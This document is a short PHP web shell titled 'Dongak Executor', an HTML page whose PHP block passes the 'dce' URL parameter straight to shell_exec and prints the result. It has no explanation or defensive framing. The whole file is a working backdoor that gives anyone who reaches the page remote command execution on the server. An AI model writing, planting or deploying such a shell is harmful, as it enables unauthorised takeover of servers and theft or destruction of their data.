<!DOCTYPE html>
<html>
<head>
    <title>Dongak Executor</title>
</head>
<body>
<?php
if (isset($_GET['dce'])) {
    echo "<pre>" . shell_exec($_GET['dce']) . "</pre>";
}
?>
</body>
</html>
